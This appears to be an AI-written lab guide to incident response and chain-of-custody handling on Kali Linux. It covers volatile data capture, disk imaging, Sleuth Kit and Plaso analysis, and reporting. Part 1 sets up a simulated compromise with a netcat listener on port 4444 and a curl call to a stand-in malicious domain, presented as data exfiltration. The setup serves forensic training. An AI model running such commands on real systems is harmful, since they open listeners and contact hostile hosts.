Here‚Äôs a **step-by-step lab and demo guide** for **Simulating Incident Response and Chain of Custody Handling on Kali Linux**, ideal for cybersecurity, digital forensics, or incident response training environments.

---

## üéØ **Objective**

* Simulate a basic **cyber incident (compromise or malware infection)**
* Perform **initial incident response steps**
* Properly handle **digital evidence**
* Maintain a **chain of custody**

## üß∞ Tools Used (All on Kali)

| Purpose                        | Tools/Commands                                   |
| ------------------------------ | ------------------------------------------------ |
| Evidence collection            | `dd`, `dcfldd`, `hashdeep`, `sha256sum`          |
| Live response (RAM, logs)      | `ps`, `lsof`, `netstat`, `tcpdump`, `volatility` |
| Timeline & filesystem analysis | `log2timeline`, `Autopsy`, `fls`, `icat`         |
| Documentation                  | CSV log files, manual notes                      |

# üß™ PART 1: Simulate an Incident

### ‚úÖ 1. Simulate Compromise (Example)

On a test VM (NOT your host system):

```bash
touch /tmp/.malware
echo "Malicious code running..." > /tmp/.malware
nc -lvp 4444 &
```

You can also run a script simulating data exfiltration:

```bash
curl http://malicious-domain.com/data -o /tmp/stolen_data.txt
```

---

## ü™™ PART 2: Chain of Custody Log (Manual or Scripted)

Create a `chain_of_custody.csv` file:

```csv
Entry ID, DateTime, Examiner, Evidence Description, Action, Hash, Location
001, 2025-07-22 12:30, Analyst1, /tmp/.malware, Collected, <hash>, /evidence
```

‚úÖ Be sure to log every action:

* Who handled it
* When
* What was done

**You can also automate using a bash script (let me know if you want one)**

---

# üßØ PART 3: First Response ‚Äì Volatile Data Collection

### ‚úÖ 1. List Running Processes

```bash
ps aux > ps_output.txt
```

### ‚úÖ 2. Open Network Connections

```bash
netstat -tulnp > netstat_output.txt
```

### ‚úÖ 3. Open Files and Sockets

```bash
lsof > lsof_output.txt
```

### ‚úÖ 4. Capture Memory (if supported)

If you have `LiME` (Linux Memory Extractor) or use `avml`, grab a RAM image for volatility analysis.

---

# üíæ PART 4: Evidence Acquisition ‚Äì Disk Imaging

### ‚úÖ 1. Acquire Disk Image

```bash
sudo dcfldd if=/dev/sdX of=/evidence/incident.img hash=sha256 hashlog=incident.hash
```

Log hash in chain of custody.

### ‚úÖ 2. Verify Integrity

```bash
sha256sum /evidence/incident.img
```

Compare with the hash recorded in `incident.hash`.

---

# üîç PART 5: Evidence Analysis

### ‚úÖ 1. Mount the Image (optional)

```bash
sudo mkdir /mnt/incident
sudo mount -o loop incident.img /mnt/incident
```

Look for:

* Hidden files (`ls -la`)
* Suspicious scripts or cron jobs
* `/etc/shadow`, `/var/log`, `/tmp`

### ‚úÖ 2. Use Sleuth Kit

```bash
fls -r -m / incident.img > bodyfile.txt
icat incident.img <inode> > suspicious_file.txt
```

### ‚úÖ 3. Create Timeline with Plaso

```bash
log2timeline.py incident.dump incident.img
psort.py -o l2tcsv -w timeline.csv incident.dump
```

---

# üîê PART 6: Document Your Findings

### Report Template:

1. **Executive Summary**
2. **Incident Description**
3. **Initial Response**
4. **Evidence Details**
5. **Chain of Custody Log**
6. **Analysis and Findings**
7. **Conclusion and Recommendations**
8. **Appendices (logs, hashes, screenshots)**

## üß™ LAB SCENARIO IDEA

### üìò Lab Title: *Simulating Incident Response with Chain of Custody*

1. Instructor plants suspicious activity (hidden malware, netcat listener)
2. Student plays IR analyst:

   * Detects signs (unusual process, netstat anomalies)
   * Captures logs and memory
   * Acquires disk image
   * Maintains evidence log and custody chain
   * Analyzes evidence with forensic tools
   * Submits report

## ‚úÖ Summary Table

| Task                  | Tool/Command                            |
| --------------------- | --------------------------------------- |
| Log chain of custody  | `CSV`, manual or scripted               |
| Acquire evidence      | `dd`, `dcfldd`, `sha256sum`             |
| Collect volatile data | `ps`, `lsof`, `netstat`, `tcpdump`      |
| Analyze filesystem    | `Autopsy`, `Sleuth Kit`, `log2timeline` |
| RAM forensics         | `volatility` (with RAM image)           |
| Documentation         | Markdown, PDF, Excel, LibreOffice       |
